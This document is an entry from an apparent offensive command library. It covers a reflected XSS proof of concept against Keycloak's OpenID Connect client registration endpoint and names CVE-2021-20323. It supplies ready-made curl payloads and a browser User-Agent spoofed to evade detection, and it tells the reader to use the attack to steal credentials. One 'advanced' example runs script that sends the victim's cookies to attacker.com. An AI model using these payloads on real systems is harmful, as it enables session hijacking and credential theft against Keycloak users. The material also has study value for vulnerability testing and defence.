---
id: cmd-keycloak-xss-post
data: >-
  curl -X POST
  'http://target.com/auth/realms/master/clients-registrations/openid-connect' -H
  'Content-Type: application/json;charset=UTF-8' -H 'User-Agent: Mozilla/5.0
  (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
  Chrome/115.0.5790.171 Safari/537.36' -d '{"<img
  onerror=confirm(\'xss_poc_unexpectedbufferc0n\') src/>":1}'
tags:
  - xss
  - poc
  - http-post
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:49.373Z'
verified: false
validated: true
submitted: true
---
# keycloak-xss-poc-post

## Command

```bash
curl -X POST 'http://target.com/auth/realms/master/clients-registrations/openid-connect' \
  -H 'Content-Type: application/json;charset=UTF-8' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36' \
  -d '{"<img onerror=confirm(\'xss_poc_unexpectedbufferc0n\') src/>":1}'
```

## Description

This command sends a POST request to the Keycloak OpenID Connect client registrations endpoint with a malicious JSON payload containing a reflected XSS vector. It demonstrates CVE-2021-20323 by triggering JavaScript execution upon response reflection. Use it in a browser-tricking scenario to steal credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `URL` | Target endpoint URL (replace target.com with actual host) | Yes |
| `-H 'Content-Type: ...'` | Sets JSON content type for the request body | Yes |
| `-H 'User-Agent: ...'` | Mimics a browser user agent to evade basic detection | No |
| `-d 'JSON payload'` | The request body with XSS payload (key is the script) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'http://keycloak.example.com/auth/realms/master/clients-registrations/openid-connect' -H 'Content-Type: application/json;charset=UTF-8' -d '{"<img onerror=alert(1) src/>":1}'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/auth/realms/master/clients-registrations/openid-connect' \
  -H 'Content-Type: application/json;charset=UTF-8' \
  -H 'User-Agent: Mozilla/5.0 ...' \
  -d '{"<script>fetch(\'http://attacker.com?cookies=\' + document.cookie)</script>":1}'
```

## Expected Output

A HTTP response (typically 400 Bad Request) with the JSON payload reflected in the body, e.g., {"<img onerror=confirm('xss_poc_unexpectedbufferc0n') src/>":"Invalid client registration"}. When rendered in HTML, this executes the JavaScript, showing a confirm dialog or sending data to the attacker.

## Related

- [[Related Procedure|procedures/Exploit-Reflected-XSS-in-Keycloak-Client-Registrations]]
